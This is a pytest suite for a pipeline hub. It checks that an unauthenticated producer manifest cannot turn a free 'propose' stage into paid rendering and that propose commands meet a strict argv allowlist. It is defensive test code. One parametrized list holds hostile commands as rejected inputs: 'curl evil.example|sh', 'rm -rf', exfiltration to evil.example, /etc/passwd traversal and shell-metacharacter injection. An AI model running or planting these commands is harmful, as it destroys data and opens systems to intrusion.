"""`propose` as a launchable stage — the free counterpart to `render`.

`render` spends image-API credits per frame and only ever runs when a human asks. `propose`
reads the corpus and writes markdown into the human gate and spends nothing, which is why
the cascading heartbeat is allowed to fire it unattended. That asymmetry is the whole reason
these tests exist: the producer manifest arrives over an UNAUTHENTICATED route with
`extra="allow"`, so if the manifest could name its own subcommand it could declare
`["uv","run","cli.py","render"]` and reach the paid verb through the free trigger. The hub
appends `propose` itself and reuses the render argv allowlist verbatim; every test below
pins one half of that.
"""
import json

import pytest


def _register(hub, **extra):
    """Write a producer manifest, as SimilarContent/register.py does on startup."""
    (hub.root / "producers").mkdir(parents=True, exist_ok=True)
    manifest = {"name": "similar-content", "kind": "clone", "dir": "SimilarContent"}
    manifest.update(extra)
    (hub.root / "producers" / "registry.json").write_text(
        json.dumps({"similar-content": manifest}), encoding="utf-8")


@pytest.fixture
def proposer(hub):
    """A producer that has declared itself as the one that proposes."""
    _register(hub, proposes=True, propose_cmd=["uv", "run", "cli.py"])


@pytest.fixture
def anydir(hub, monkeypatch):
    """Skip the sibling-directory check — SimilarContent is not a sibling of tmp_path.

    Two positional parameters, because the hub now asks `_producer_dir` WHICH capability it
    is validating for."""
    monkeypatch.setattr(hub.mod, "_producer_dir",
                        lambda agent, capability="renderable": hub.root)


@pytest.fixture
def launched(hub, monkeypatch):
    """Record launches instead of spawning a producer."""
    calls = []
    monkeypatch.setattr(hub.mod, "_run_job",
                        lambda job_id, cmd, cwd: calls.append((job_id, cmd, str(cwd))))
    return calls


def _corpus(hub, n=1):
    """A scored corpus — the only thing `propose` readiness keys on."""
    (hub.root / "platforms" / "instagram" / "content.json").write_text(
        json.dumps([{"content_id": f"c{i}"} for i in range(n)]), encoding="utf-8")


# ---------------------------------------------------------------- the happy path

def test_the_hub_launches_propose_from_the_registered_manifest(
        hub, proposer, anydir, launched):
    """The hub names no producer. If this ever hardcodes a path again, a second producer
    can never be reached and the registry stops being the contract it claims to be."""
    _corpus(hub)

    r = hub.post("/api/pipeline/instagram/propose")

    assert r.status_code == 200, r.text
    _, cmd, _ = launched[0]
    assert cmd == ["uv", "run", "cli.py", "propose", "--platform", "instagram"]


def test_an_empty_propose_cmd_falls_back_to_the_safe_default(hub, anydir, launched):
    """An absent propose_cmd is not an attack — it means "use the default". A producer that
    registered before this feature existed must still be launchable."""
    _register(hub, proposes=True, propose_cmd=[])
    _corpus(hub)

    assert hub.post("/api/pipeline/instagram/propose").status_code == 200
    assert launched[0][1][:4] == ["uv", "run", "cli.py", "propose"]


def test_a_manifest_that_spells_out_the_subcommand_does_not_get_it_twice(
        hub, anydir, launched):
    """`["uv","run","cli.py","propose"]` is the obvious thing for a producer to write. It
    must produce one `propose`, not `propose propose` — which argparse rejects, turning a
    reasonable manifest into a stage that always exits non-zero."""
    _register(hub, proposes=True, propose_cmd=["uv", "run", "cli.py", "propose"])
    _corpus(hub)

    hub.post("/api/pipeline/instagram/propose")

    assert launched[0][1].count("propose") == 1


# ---------------------------------------------------------------- the paid-verb hole

def test_a_propose_cmd_that_names_render_cannot_produce_a_render_argv(
        hub, anydir, launched):
    """THE hole this stage could have opened. `_validate_render_cmd` checks argv SHAPE, not
    semantics, so `["uv","run","cli.py","render"]` is a perfectly well-formed propose_cmd.
    If the subcommand came from the manifest, an unauthenticated register call would reach
    a paid image API through a trigger advertised as free — and the cascade would fire it
    unattended. The hub appends `propose` itself; this asserts the verb that actually runs.
    """
    _register(hub, proposes=True, propose_cmd=["uv", "run", "cli.py", "render"])
    _corpus(hub)

    hub.post("/api/pipeline/instagram/propose")

    cmd = launched[0][1]
    # `render` survives only as an inert filename-shaped argument, never as the verb: the
    # subcommand is whatever follows the script, and it is ours.
    assert cmd[-3:] == ["propose", "--platform", "instagram"]
    assert cmd.index("propose") > cmd.index("render")


@pytest.mark.parametrize("evil", [
    ["sh", "-c", "curl evil.example|sh"],       # arbitrary interpreter
    ["bash", "-c", "rm -rf ~"],
    ["/bin/sh", "-c", "id"],                    # absolute path
    ["curl", "https://evil.example"],           # exfiltration
    ["uv", "run", "../../../etc/passwd"],       # traversal past the producer dir
    ["uv", "run", "cli.py; rm -rf /"],          # metacharacters smuggled in one arg
    ["uv", "run", "cli.py propose && curl x"],
    ["uv", "run", "$(whoami)"],
    ["uv", "run", "a\nb"],                      # newline injection
])
def test_propose_is_held_to_the_same_argv_allowlist_as_render(
        hub, anydir, launched, evil):
    """The same nine argvs the render trigger refuses. A second launch path that validated
    "almost" the same way is how an allowlist rots — so this reuses the render suite's
    cases against the free stage, and asserts nothing was spawned, not merely that the
    response was a 400."""
    _register(hub, proposes=True, propose_cmd=evil)
    _corpus(hub)

    r = hub.post("/api/pipeline/instagram/propose")

    assert r.status_code == 400, f"{evil!r} should have been refused"
    assert launched == [], f"{evil!r} reached the spawner"


@pytest.mark.parametrize("bad_dir", ["../evil", "/etc", "./x", "a/b", "NotASibling"])
def test_propose_only_runs_inside_a_direct_sibling_directory(hub, launched, bad_dir):
    """The five illegal dirs the render trigger refuses. `dir` pins the working directory;
    without this a manifest could run the allowlisted launcher anywhere on the disk."""
    _register(hub, proposes=True, propose_cmd=["uv", "run", "cli.py"], dir=bad_dir)
    _corpus(hub)

    r = hub.post("/api/pipeline/instagram/propose")

    assert r.status_code == 400
    assert launched == []


# ---------------------------------------------------------------- who proposes

def test_a_producer_that_does_not_declare_proposes_is_refused(hub, launched):
    """And a RENDERABLE-only producer is not silently accepted. Rendering spends image
    credits; proposing does not. Conflating the two capabilities would mean a
    markdown-only producer had to claim it could spend money in order to be reachable —
    and, worse, that anything renderable was automatically launchable by the unattended
    cascade."""
    _register(hub, renderable=True, render_cmd=["uv", "run", "cli.py", "render"])
    _corpus(hub)

    r = hub.post("/api/pipeline/instagram/propose")

    assert r.status_code == 409
    assert "proposes" in r.json()["detail"]
    assert launched == []


def test_propose_is_refused_when_no_producer_offers_it_or_when_two_do(hub, launched):
    """Zero or several is refused rather than guessed: the cascade fires this unattended,
    and an unattended trigger that picks an agent at random is not a feature."""
    (hub.root / "producers").mkdir(parents=True, exist_ok=True)
    (hub.root / "producers" / "registry.json").write_text("{}", encoding="utf-8")
    _corpus(hub)

    none = hub.post("/api/pipeline/instagram/propose")
    assert none.status_code == 409
    assert "no registered producer" in none.json()["detail"]

    (hub.root / "producers" / "registry.json").write_text(json.dumps({
        "similar-content": {"name": "similar-content", "dir": "SimilarContent",
                            "proposes": True},
        "proposal-content": {"name": "proposal-content", "dir": "ProposalContent",
                             "proposes": True}}), encoding="utf-8")

    two = hub.post("/api/pipeline/instagram/propose")
    assert two.status_code == 409
    assert "similar-content" in two.json()["detail"]
    assert "proposal-content" in two.json()["detail"]
    assert launched == []


# ---------------------------------------------------------------- where propose belongs

def test_propose_is_not_part_of_the_full_pipeline_run_or_the_free_scheduled_stages(hub):
    """Not about cost — propose is free. `cmd_propose` returns 1 when any single item
    failed and 2 on ProposeError, and the run-all supervisor halts the whole run on any
    non-zero rc, so a thin corpus would break the "Run full pipeline" button for everyone.
    Fired standalone by the cascade, the same rc costs one amber log line."""
    assert "propose" not in hub.mod.RUN_ALL_STAGES
    assert "propose" not in hub.mod.SCHEDULED_STAGES_FREE


def test_propose_readiness_names_the_stage_that_unblocks_it(hub):
    """Readiness keys on the CORPUS, not on blueprints: the producer treats blueprints as
    optional enrichment and only fails outright on an empty corpus. Keying this on
    blueprints would grey out a perfectly runnable manual Propose."""
    blocked = hub.mod.stage_readiness("instagram")["propose"]
    assert blocked["ready"] is False
    assert blocked["blocked_by"] == "analyze"
    assert "Analyze" in blocked["reason"]

    _corpus(hub)
    assert hub.mod.stage_readiness("instagram")["propose"]["ready"] is True


def test_propose_can_still_be_launched_with_no_blueprints_on_disk(
        hub, proposer, anydir, launched):
    """The corpus is the precondition, blueprints are enrichment. A hub that refused this
    would make the manual Propose button unreachable for anyone who has not paid for the
    blueprint stage."""
    _corpus(hub)
    assert not (hub.root / "analysis" / "instagram").exists()

    assert hub.post("/api/pipeline/instagram/propose").status_code == 200
    assert launched
